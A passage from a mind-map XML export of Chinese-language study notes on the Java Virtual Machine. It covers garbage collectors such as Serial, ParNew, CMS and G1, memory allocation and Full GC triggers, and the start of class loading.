</a><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/3978098bfac09b40f88444cc17dde8595229027c5d43a149e6234a154f546b13/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f32326664613461652d346464352d343839642d616231302d3965626664616432326165302e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/3978098bfac09b40f88444cc17dde8595229027c5d43a149e6234a154f546b13/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f32326664613461652d346464352d343839642d616231302d3965626664616432326165302e6a7067" width="" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/22fda4ae-4dd5-489d-ab10-9ebfdad22ae0.jpg"/></a><br/>
    <p dir="auto">
      Serial 翻译为串行，也就是说它以串行的方式执行。
    </p>
    <p dir="auto">
      它是单线程的收集器，只会使用一个线程进行垃圾收集工作。
    </p>
    <p dir="auto">
      它的优点是简单高效，在单个 CPU 环境下，由于没有线程交互的开销，因此拥有最高的单线程收集效率。
    </p>
    <p dir="auto">
      它是 Client 场景下的默认新生代收集器，因为在该场景下内存一般来说不会很大。它收集一两百兆垃圾的停顿时间可以控制在一百多毫秒以内，只要不是太频繁，这点停顿时间是可以接受的。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_763849360" CREATED="1754750650709" MODIFIED="1754750650710"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. ParNew 收集器
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. ParNew 收集器" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#2-parnew-收集器">
</a><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/5baaa22fa98c65507fab4e7a340a366d63e426cc48265c6a953bdc3017c516f0/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f38313533386364352d316263662d346533312d383665352d6531393864663165303133622e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/5baaa22fa98c65507fab4e7a340a366d63e426cc48265c6a953bdc3017c516f0/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f38313533386364352d316263662d346533312d383665352d6531393864663165303133622e6a7067" width="" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/81538cd5-1bcf-4e31-86e5-e198df1e013b.jpg"/></a><br/>
    <p dir="auto">
      它是 Serial 收集器的多线程版本。
    </p>
    <p dir="auto">
      它是 Server 场景下默认的新生代收集器，除了性能原因外，主要是因为除了 Serial 收集器，只有它能与 CMS 收集器配合使用。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1952847207" CREATED="1754750650710" MODIFIED="1754750650712"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. Parallel Scavenge 收集器
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. Parallel Scavenge 收集器" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#3-parallel-scavenge-收集器">
</a>
    <p dir="auto">
      与 ParNew 一样是多线程收集器。
    </p>
    <p dir="auto">
      其它收集器目标是尽可能缩短垃圾收集时用户线程的停顿时间，而它的目标是达到一个可控制的吞吐量，因此它被称为“吞吐量优先”收集器。这里的吞吐量指 CPU 用于运行用户程序的时间占总时间的比值。
    </p>
    <p dir="auto">
      停顿时间越短就越适合需要与用户交互的程序，良好的响应速度能提升用户体验。而高吞吐量则可以高效率地利用 CPU 时间，尽快完成程序的运算任务，适合在后台运算而不需要太多交互的任务。
    </p>
    <p dir="auto">
      缩短停顿时间是以牺牲吞吐量和新生代空间来换取的：新生代空间变小，垃圾回收变得频繁，导致吞吐量下降。
    </p>
    <p dir="auto">
      可以通过一个开关参数打开 GC 自适应的调节策略（GC Ergonomics），就不需要手工指定新生代的大小（-Xmn）、Eden 和 Survivor 区的比例、晋升老年代对象年龄等细节参数了。虚拟机会根据当前系统的运行情况收集性能监控信息，动态调整这些参数以提供最合适的停顿时间或者最大的吞吐量。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_970507246" CREATED="1754750650712" MODIFIED="1754750650714"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. Serial Old 收集器
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 4. Serial Old 收集器" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#4-serial-old-收集器">
</a><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/cf1fa8f6f256d778dd4fc3ec859c8973af9f82284a0fbf8f1ed680468cca6197/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f30386633326664332d663733362d346136372d383163612d3239356232613739373266322e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/cf1fa8f6f256d778dd4fc3ec859c8973af9f82284a0fbf8f1ed680468cca6197/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f30386633326664332d663733362d346136372d383163612d3239356232613739373266322e6a7067" width="" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/08f32fd3-f736-4a67-81ca-295b2a7972f2.jpg"/></a><br/>
    <p dir="auto">
      是 Serial 收集器的老年代版本，也是给 Client 场景下的虚拟机使用。如果用在 Server 场景下，它有两大用途：
    </p>
    <ul dir="auto">
      <li>
        在 JDK 1.5 以及之前版本（Parallel Old 诞生以前）中与 Parallel Scavenge 收集器搭配使用。
      </li>
      <li>
        作为 CMS 收集器的后备预案，在并发收集发生 Concurrent Mode Failure 时使用。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_567657774" CREATED="1754750650714" MODIFIED="1754750650716"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. Parallel Old 收集器
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 5. Parallel Old 收集器" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#5-parallel-old-收集器">
</a><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/55ad5db3c11f50306890d34a34b9fb9f51818e4a307c8baa1689da24e412c712/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f32373866653433312d616638382d346139352d613839352d3963336238303131376465332e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/55ad5db3c11f50306890d34a34b9fb9f51818e4a307c8baa1689da24e412c712/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f32373866653433312d616638382d346139352d613839352d3963336238303131376465332e6a7067" width="" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/278fe431-af88-4a95-a895-9c3b80117de3.jpg"/></a><br/>
    <p dir="auto">
      是 Parallel Scavenge 收集器的老年代版本。
    </p>
    <p dir="auto">
      在注重吞吐量以及 CPU 资源敏感的场合，都可以优先考虑 Parallel Scavenge 加 Parallel Old 收集器。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1591461009" CREATED="1754750650716" MODIFIED="1754750650718"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      6. CMS 收集器
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 6. CMS 收集器" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#6-cms-收集器">
</a><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/3ef90bd0f7608e3d808cc7db96b874bc96d8696d2e212613167d1983bd6c3455/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f36326537373939372d363935372d346236382d386431322d6266643630396262326336382e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/3ef90bd0f7608e3d808cc7db96b874bc96d8696d2e212613167d1983bd6c3455/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f36326537373939372d363935372d346236382d386431322d6266643630396262326336382e6a7067" width="" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/62e77997-6957-4b68-8d12-bfd609bb2c68.jpg"/></a><br/>
    <p dir="auto">
      CMS（Concurrent Mark Sweep），Mark Sweep 指的是标记 - 清除算法。
    </p>
    <p dir="auto">
      分为以下四个流程：
    </p>
    <ul dir="auto">
      <li>
        初始标记：仅仅只是标记一下 GC Roots 能直接关联到的对象，速度很快，需要停顿。
      </li>
      <li>
        并发标记：进行 GC Roots Tracing 的过程，它在整个回收过程中耗时最长，不需要停顿。
      </li>
      <li>
        重新标记：为了修正并发标记期间因用户程序继续运作而导致标记产生变动的那一部分对象的标记记录，需要停顿。
      </li>
      <li>
        并发清除：不需要停顿。
      </li>
    </ul>
    <p dir="auto">
      在整个过程中耗时最长的并发标记和并发清除过程中，收集器线程都可以与用户线程一起工作，不需要进行停顿。
    </p>
    <p dir="auto">
      具有以下缺点：
    </p>
    <ul dir="auto">
      <li>
        吞吐量低：低停顿时间是以牺牲吞吐量为代价的，导致 CPU 利用率不够高。
      </li>
      <li>
        无法处理浮动垃圾，可能出现 Concurrent Mode Failure。浮动垃圾是指并发清除阶段由于用户线程继续运行而产生的垃圾，这部分垃圾只能到下一次 GC 时才能进行回收。由于浮动垃圾的存在，因此需要预留出一部分内存，意味着 CMS 收集不能像其它收集器那样等待老年代快满的时候再回收。如果预留的内存不够存放浮动垃圾，就会出现 Concurrent Mode Failure，这时虚拟机将临时启用 Serial Old 来替代 CMS。
      </li>
      <li>
        标记 - 清除算法导致的空间碎片，往往出现老年代空间剩余，但无法找到足够大连续空间来分配当前对象，不得不提前触发一次 Full GC。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_184159193" CREATED="1754750650718" MODIFIED="1754750650720"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      7. G1 收集器
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 7. G1 收集器" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#7-g1-收集器">
</a>
    <p dir="auto">
      G1（Garbage-First），它是一款面向服务端应用的垃圾收集器，在多 CPU 和大内存的场景下有很好的性能。HotSpot 开发团队赋予它的使命是未来可以替换掉 CMS 收集器。
    </p>
    <p dir="auto">
      堆被分为新生代和老年代，其它收集器进行收集的范围都是整个新生代或者老年代，而 G1 可以直接对新生代和老年代一起回收。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/28712794ed2119169d543cf480dea5072e62cec8c6e8f921b71803cf6cb7bf1d/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f34636637313161382d376162322d343135322d623835632d6435633232363733333830372e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/28712794ed2119169d543cf480dea5072e62cec8c6e8f921b71803cf6cb7bf1d/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f34636637313161382d376162322d343135322d623835632d6435633232363733333830372e706e67" width="600" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/4cf711a8-7ab2-4152-b85c-d5c226733807.png"/>
    </a><br/>
    

    <p dir="auto">
      G1 把堆划分成多个大小相等的独立区域（Region），新生代和老年代不再物理隔离。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/ffb4cb91bfdaafef8b38257b244aec0f9270b858d08b68f3e3215afe7e679090/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f39626264646565622d653933392d343166302d386538652d3262316130616137653061372e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/ffb4cb91bfdaafef8b38257b244aec0f9270b858d08b68f3e3215afe7e679090/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f39626264646565622d653933392d343166302d386538652d3262316130616137653061372e706e67" width="600" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/9bbddeeb-e939-41f0-8e8e-2b1a0aa7e0a7.png"/>
    </a><br/>
    

    <p dir="auto">
      通过引入 Region 的概念，从而将原来的一整块内存空间划分成多个的小空间，使得每个小空间可以单独进行垃圾回收。这种划分方法带来了很大的灵活性，使得可预测的停顿时间模型成为可能。通过记录每个 Region 垃圾回收时间以及回收所获得的空间（这两个值是通过过去回收的经验获得），并维护一个优先列表，每次根据允许的收集时间，优先回收价值最大的 Region。
    </p>
    <p dir="auto">
      每个 Region 都有一个 Remembered Set，用来记录该 Region 对象的引用对象所在的 Region。通过使用 Remembered Set，在做可达性分析的时候就可以避免全堆扫描。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/e3b1e67b58e1d4ffd8acc8a17ba04768278597178b955e4102555273337acc05/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f66393965653737312d633536662d343766622d393134382d6330303336363935623566652e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/e3b1e67b58e1d4ffd8acc8a17ba04768278597178b955e4102555273337acc05/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f66393965653737312d633536662d343766622d393134382d6330303336363935623566652e6a7067" width="" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f99ee771-c56f-47fb-9148-c0036695b5fe.jpg"/>
    </a><br/>
    

    <p dir="auto">
      如果不计算维护 Remembered Set 的操作，G1 收集器的运作大致可划分为以下几个步骤：
    </p>
    <ul dir="auto">
      <li>
        初始标记
      </li>
      <li>
        并发标记
      </li>
      <li>
        最终标记：为了修正在并发标记期间因用户程序继续运作而导致标记产生变动的那一部分标记记录，虚拟机将这段时间对象变化记录在线程的 Remembered Set Logs 里面，最终标记阶段需要把 Remembered Set Logs 的数据合并到 Remembered Set 中。这阶段需要停顿线程，但是可并行执行。
      </li>
      <li>
        筛选回收：首先对各个 Region 中的回收价值和成本进行排序，根据用户所期望的 GC 停顿时间来制定回收计划。此阶段其实也可以做到与用户程序一起并发执行，但是因为只回收一部分 Region，时间是用户可控制的，而且停顿用户线程将大幅度提高收集效率。
      </li>
    </ul>
    <p dir="auto">
      具备如下特点：
    </p>
    <ul dir="auto">
      <li>
        空间整合：整体来看是基于“标记 - 整理”算法实现的收集器，从局部（两个 Region 之间）上来看是基于“复制”算法实现的，这意味着运行期间不会产生内存空间碎片。
      </li>
      <li>
        可预测的停顿：能让使用者明确指定在一个长度为 M 毫秒的时间片段内，消耗在 GC 上的时间不得超过 N 毫秒。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node FOLDED="true" ID="ID_455253251" CREATED="1754750650720" MODIFIED="1754750650720"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      三、内存分配与回收策略
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_307255330" CREATED="1754750650721" MODIFIED="1754750650723"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Minor GC 和 Full GC
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Minor GC 和 Full GC" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#minor-gc-和-full-gc">
</a>
    <ul dir="auto">
      <li>
        <p dir="auto">
          Minor GC：回收新生代，因为新生代对象存活时间很短，因此 Minor GC 会频繁执行，执行的速度一般也会比较快。
        </p>
      </li>
      <li>
        <p dir="auto">
          Full GC：回收老年代和新生代，老年代对象其存活时间长，因此 Full GC 很少执行，执行速度会比 Minor GC 慢很多。
        </p>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_88353474" CREATED="1754750650723" MODIFIED="1754750650723"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      内存分配策略
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1685410448" CREATED="1754750650724" MODIFIED="1754750650726"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 对象优先在 Eden 分配
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 对象优先在 Eden 分配" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#1-对象优先在-eden-分配">
</a>
    <p dir="auto">
      大多数情况下，对象在新生代 Eden 上分配，当 Eden 空间不够时，发起 Minor GC。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_747887068" CREATED="1754750650726" MODIFIED="1754750650728"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 大对象直接进入老年代
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 大对象直接进入老年代" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#2-大对象直接进入老年代">
</a>
    <p dir="auto">
      大对象是指需要连续内存空间的对象，最典型的大对象是那种很长的字符串以及数组。
    </p>
    <p dir="auto">
      经常出现大对象会提前触发垃圾收集以获取足够的连续空间分配给大对象。
    </p>
    <p dir="auto">
      -XX:PretenureSizeThreshold，大于此值的对象直接在老年代分配，避免在 Eden 和 Survivor 之间的大量内存复制。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_224530779" CREATED="1754750650728" MODIFIED="1754750650729"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 长期存活的对象进入老年代
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. 长期存活的对象进入老年代" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#3-长期存活的对象进入老年代">
</a>
    <p dir="auto">
      为对象定义年龄计数器，对象在 Eden 出生并经过 Minor GC 依然存活，将移动到 Survivor 中，年龄就增加 1 岁，增加到一定年龄则移动到老年代中。
    </p>
    <p dir="auto">
      -XX:MaxTenuringThreshold 用来定义年龄的阈值。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1436902960" CREATED="1754750650729" MODIFIED="1754750650731"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 动态对象年龄判定
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 4. 动态对象年龄判定" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#4-动态对象年龄判定">
</a>
    <p dir="auto">
      虚拟机并不是永远要求对象的年龄必须达到 MaxTenuringThreshold 才能晋升老年代，如果在 Survivor 中相同年龄所有对象大小的总和大于 Survivor 空间的一半，则年龄大于或等于该年龄的对象可以直接进入老年代，无需等到 MaxTenuringThreshold 中要求的年龄。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1500554520" CREATED="1754750650732" MODIFIED="1754750650734"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. 空间分配担保
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 5. 空间分配担保" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#5-空间分配担保">
</a>
    <p dir="auto">
      在发生 Minor GC 之前，虚拟机先检查老年代最大可用的连续空间是否大于新生代所有对象总空间，如果条件成立的话，那么 Minor GC 可以确认是安全的。
    </p>
    <p dir="auto">
      如果不成立的话虚拟机会查看 HandlePromotionFailure 的值是否允许担保失败，如果允许那么就会继续检查老年代最大可用的连续空间是否大于历次晋升到老年代对象的平均大小，如果大于，将尝试着进行一次 Minor GC；如果小于，或者 HandlePromotionFailure 的值不允许冒险，那么就要进行一次 Full GC。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_767286902" CREATED="1754750650734" MODIFIED="1754750650736"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Full GC 的触发条件
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Full GC 的触发条件" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#full-gc-的触发条件">
</a>
    <p dir="auto">
      对于 Minor GC，其触发条件非常简单，当 Eden 空间满时，就将触发一次 Minor GC。而 Full GC 则相对复杂，有以下条件：
    </p>
  </body>
</html></richcontent>
<node ID="ID_1995827960" CREATED="1754750650736" MODIFIED="1754750650738"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 调用 System.gc()
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 调用 System.gc()" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#1-调用-systemgc">
</a>
    <p dir="auto">
      只是建议虚拟机执行 Full GC，但是虚拟机不一定真正去执行。不建议使用这种方式，而是让虚拟机管理内存。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1886129790" CREATED="1754750650738" MODIFIED="1754750650740"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 老年代空间不足
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 老年代空间不足" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#2-老年代空间不足">
</a>
    <p dir="auto">
      老年代空间不足的常见场景为前文所讲的大对象直接进入老年代、长期存活的对象进入老年代等。
    </p>
    <p dir="auto">
      为了避免以上原因引起的 Full GC，应当尽量不要创建过大的对象以及数组。除此之外，可以通过 -Xmn 虚拟机参数调大新生代的大小，让对象尽量在新生代被回收掉，不进入老年代。还可以通过 -XX:MaxTenuringThreshold 调大对象进入老年代的年龄，让对象在新生代多存活一段时间。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1647493468" CREATED="1754750650740" MODIFIED="1754750650741"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 空间分配担保失败
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. 空间分配担保失败" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#3-空间分配担保失败">
</a>
    <p dir="auto">
      使用复制算法的 Minor GC 需要老年代的内存空间作担保，如果担保失败会执行一次 Full GC。具体内容请参考上面的第 5 小节。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1776925386" CREATED="1754750650742" MODIFIED="1754750650743"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. JDK 1.7 及以前的永久代空间不足
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 4. JDK 1.7 及以前的永久代空间不足" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#4-jdk-17-及以前的永久代空间不足">
</a>
    <p dir="auto">
      在 JDK 1.7 及以前，HotSpot 虚拟机中的方法区是用永久代实现的，永久代中存放的为一些 Class 的信息、常量、静态变量等数据。
    </p>
    <p dir="auto">
      当系统中要加载的类、反射的类和调用的方法较多时，永久代可能会被占满，在未配置为采用 CMS GC 的情况下也会执行 Full GC。如果经过 Full GC 仍然回收不了，那么虚拟机会抛出 java.lang.OutOfMemoryError。
    </p>
    <p dir="auto">
      为避免以上原因引起的 Full GC，可采用的方法为增大永久代空间或转为使用 CMS GC。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1310563740" CREATED="1754750650744" MODIFIED="1754750650745"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. Concurrent Mode Failure
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 5. Concurrent Mode Failure" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#5-concurrent-mode-failure">
</a>
    <p dir="auto">
      执行 CMS GC 的过程中同时有对象要放入老年代，而此时老年代空间不足（可能是 GC 过程中浮动垃圾过多导致暂时性的空间不足），便会报 Concurrent Mode Failure 错误，并触发 Full GC。
    </p>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node FOLDED="true" ID="ID_944915908" CREATED="1754750650746" MODIFIED="1754750650747"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      四、类加载机制
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 四、类加载机制" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#四类加载机制">
</a>
    <p dir="auto">
      类是在运行期间第一次使用时动态加载的，而不是一次性加载所有类。因为如果一次性加载，那么会占用很多的内存。
    </p>
  </body>
</html></richcontent>
<node ID="ID_1903383223" CREATED="1754750650747" MODIFIED="1754750650749"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      类的生命周期
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 类的生命周期" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#类的生命周期">
</a><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/578a1dd7a4987439715ddacba9bc88a425d9d587506bd2b5b8eee80b6521cc92/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f33333566653139632d346137362d343561622d393332302d3838633930643661306437652e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/578a1dd7a4987439715ddacba9bc88a425d9d587506bd2b5b8eee80b6521cc92/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f33333566653139632d346137362d343561622d393332302d3838633930643661306437652e706e67" width="600px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/335fe19c-4a76-45ab-9320-88c90d6a0d7e.png"/></a><br/>
    <p dir="auto">
      包括以下 7 个阶段：
    </p>
    <ul dir="auto">
      <li>
        <strong>加载（Loading）</strong>
      </li>
      <li>
        <strong>验证（Verification）</strong>
      </li>
      <li>
        <strong>准备（Preparation）</strong>
      </li>
      <li>
        <strong>解析（Resolution）</strong>
      </li>
      <li>
        <strong>初始化（Initialization）</strong>
      </li>
      <li>
        使用（Using）
      </li>
      <li>
        卸载（Unloading）
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_82890787" CREATED="1754750650749" MODIFIED="1754750650751"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      类加载过程
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 类加载过程" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#类加载过程">
</a>
    <p dir="auto">
